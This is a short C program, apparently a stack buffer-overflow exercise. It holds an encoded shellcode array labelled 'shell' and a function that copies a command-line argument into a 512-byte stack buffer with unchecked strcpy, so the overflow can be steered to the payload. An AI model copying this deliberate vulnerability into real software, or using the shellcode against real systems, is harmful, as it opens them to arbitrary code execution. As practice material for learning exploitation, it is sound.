#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define BUFFER_SIZE 512
  
 

	// shell
    char shellcode_shell[70] = "\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e" ;

	int main(int argc, char **argv)
		{
	char buf[2048]  ;

	printf("Shellcode_shell: 0x%08x\n",&shellcode_shell);
	printf("\tArgument Size: \033[41;1m%d\033[0m bytes \n", strlen(argv[1]));
	strcpy(buf,argv[1]);
	overflow(buf);

	
	printf("pwd\n"); //
	puts("uname -a"); 
	exit(0);
	}

	void overflow(char *tmp) {
	char buffer[BUFFER_SIZE]  ;
	printf("\tTake: \033[36;1m%d\033[0m (Max DATA) From Argv and copy it on \033[36;1m%d\033[0m \n", strlen(tmp),BUFFER_SIZE);
	strcpy(buffer,tmp);
	}


